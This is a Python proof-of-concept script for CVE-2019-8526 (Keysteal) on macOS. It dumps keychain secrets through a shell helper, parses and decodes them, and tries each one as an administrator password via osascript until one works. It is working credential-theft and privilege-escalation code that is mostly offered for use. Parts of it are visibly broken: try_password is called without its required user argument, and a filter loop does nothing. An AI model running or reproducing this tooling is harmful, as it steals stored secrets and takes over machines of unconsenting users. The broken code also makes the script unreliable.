import base64
import binascii
import json
import os
import re
import subprocess
from json import JSONDecodeError
import uuid

'''
References: https://github.com/LinusHenze/Keysteal, https://github.com/thehappydinoa/rootOS
CVE: 2019-8526
'''
def random_string():
    """generates random string"""
    return str(uuid.uuid4())[:8]

def try_password(password, user):
    """tries user passwords"""
    rand = random_string()
    payload = """osascript <<END
      set command to "echo {success}"
      return do shell script command user name "{user}" password "{password}" with administrator privileges
    END""".format(
        success=rand, user=user, password=password
    )
    response = osascript(payload)
    return rand in response

def get_values(i_obj):
    """gets values recursively"""
    values = list()
    if isinstance(i_obj, list):
        t_values = i_obj
    elif isinstance(i_obj, dict):
        t_values = i_obj.values()
    for t_value in t_values:
        if isinstance(t_value, dict):
            values.extend(get_values(t_value))
        elif isinstance(t_value, list):
            values.extend(t_value)
        else:
            values.append(str(t_value))
    return values

def osascript(command):
    """runs shell for osascript"""
    osa = subprocess.Popen([command], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    response = osa.communicate()[0].strip()
    if isinstance(response, bytes):
        return response.decode("utf-8")
    return response


def read_passwords(text):
    """gets passwords from text"""
    data = re.findall('data:\n"(.*)"\nkeychain:', text) + re.findall(
        "data:\n'(.*)'\nkeychain:", text
    )
    passwords = list()
    for password in data:
        # Base64
        try:
            if base64.b64encode(base64.b64decode(password)) == password:
                password = base64.b64decode(password)
        except (TypeError, binascii.Error):
            pass

        password = str(password).strip()

        # JSON
        if password.startswith("{") or password.startswith("["):
            try:
                password = json.loads(password)
                values = get_values(password)
                passwords.extend(values)
                continue
            except JSONDecodeError:
                pass

        for bad_char in ["`", '"', "'"]:
            if bad_char in password:
                continue

        if len(password) > 31 or len(password) < 4 or not password[0]:
            continue

        passwords.append(password)

    return passwords

if __name__ == '__main__':

    ''' Execute  KeySteal PoC '''
    cmd_output = osascript("sh ./dump-keychain.sh")

    ''' Store Results '''
    passwords = read_passwords(cmd_output)

    ''' Try Passwords '''
    print("\nTrying passwords...\n")
    real_password = None

    for passwd in passwords:
        try:
            print(" Trying: {password}".format(password=passwd), end="\r")
            valid = try_password(passwd)
        except Exception as e:
            print(type(e))
            print(str(e))
            continue
        if valid:
            real_password = passwd
            break

    print("\nPassword: " + real_password)
